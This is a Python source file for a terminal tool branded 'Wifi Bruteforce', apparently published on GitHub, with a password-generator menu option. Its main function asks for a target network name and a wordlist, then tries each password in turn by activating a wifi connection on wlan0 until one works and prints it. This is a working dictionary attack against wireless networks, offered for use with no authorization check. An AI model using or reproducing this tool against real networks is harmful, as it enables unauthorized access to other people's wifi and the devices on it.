import os
import sys
import time
import subprocess
import random
import string
from multiprocessing import Pool
from wifi import Cell, Scheme
from colorama import *

# Отключение вывода сообщений от wifi
import logging
logging.getLogger('wifi').setLevel(logging.ERROR)

def show_logo():
    os.system('clear')
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + """
██╗    ██╗██╗███████╗██╗                                                           
██║    ██║██║██╔════╝██║                                                           
██║ █╗ ██║██║█████╗  ██║                                                           
██║███╗██║██║██╔══╝  ██║                                                           
╚███╔███╔╝██║██║     ██║                                                           
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝                                                           
                                                                                    
██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝██████╔╝██║   ██║   ██║   █████╗  █████╗  ██║   ██║██████╔╝██║     █████╗  
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
                                    Linux Version 2.0     By DenTs123 (GitHub)""")

def update_msg(text):
    message = f'\r{text}'
    sys.stdout.write(message)
    sys.stdout.flush()

def main1():
    show_logo()

    def password_correct(ssid, password):
        scheme = Scheme.find('wlan0', ssid)
        if scheme is None:
            scheme = Scheme.for_cell('wlan0', ssid, Cell.all('wlan0')[0], password)

        try:
            scheme.activate()
            update_msg(Fore.LIGHTGREEN_EX + f"Crack success! Password is {password}{' ' * int(len(password) + 1)}" + Fore.RESET)
            return True
        except:
            update_msg(Fore.RED + f"Incorrect password: {password}{' ' * int(len(password) + 1)}" + Fore.RESET)
            return False

    def crack_passwords(ssid, file):
        with open(file, 'r', encoding='utf8') as words:
            for line in words:
                password = line.rstrip("\n")
                if password_correct(ssid, password):
                    break

    selected_network = input(Fore.BLUE + "Input the SSID (name) of the network you want to crack: " + Fore.RESET)
    wordlist_file = input(Fore.BLUE + "Input the path to the wordlist file: " + Fore.RESET)

    if not os.path.isfile(wordlist_file):
        print(Fore.RED + "Error: Wordlist file not found." + Fore.RESET)
        return

    update_msg(f"Starting wifi bruteforce on network: {selected_network}")
    crack_passwords(selected_network, wordlist_file)

def generator():
    show_logo()
    password_length = int(input("\033[96mEnter the desired length of the password: \033[0m"))
    generated_password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(password_length))
    print(f"\033[95mGenerated password: {generated_password}\033[0m")

def main():
    show_logo()
    print("\033[96m[1] Launch 'Wifi bruteforce'\n[2] Password generator\n[3] About author\033[0m")
    print()
    user_input = input("\033[96m> \033[0m")
    if user_input == '1':
        main1()
    elif user_input == '2':
        print(Fore.CYAN + Style.BRIGHT + """
██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗ 
██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝
██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗
╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║
 ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
                                                                                """)
        generator()
    elif user_input == '3':
        show_logo()
        print(Fore.CYAN + Style.BRIGHT + """
 ██████╗██████╗ ███████╗██████╗ ██╗████████╗███████╗
██╔════╝██╔══██╗██╔════╝██╔══██╗██║╚══██╔══╝██╔════╝
██║     ██████╔╝█████╗  ██║  ██║██║   ██║   ███████╗
██║     ██╔══██╗██╔══╝  ██║  ██║██║   ██║   ╚════██║
╚██████╗██║  ██║███████╗██████╔╝██║   ██║   ███████║
 ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝   ╚═╝   ╚══════╝
                                                    """)
        print("\033[96mDenTs123\nGitHub: https://github.com/DenTs123\033[0m")

if __name__ == "__main__":
    main()
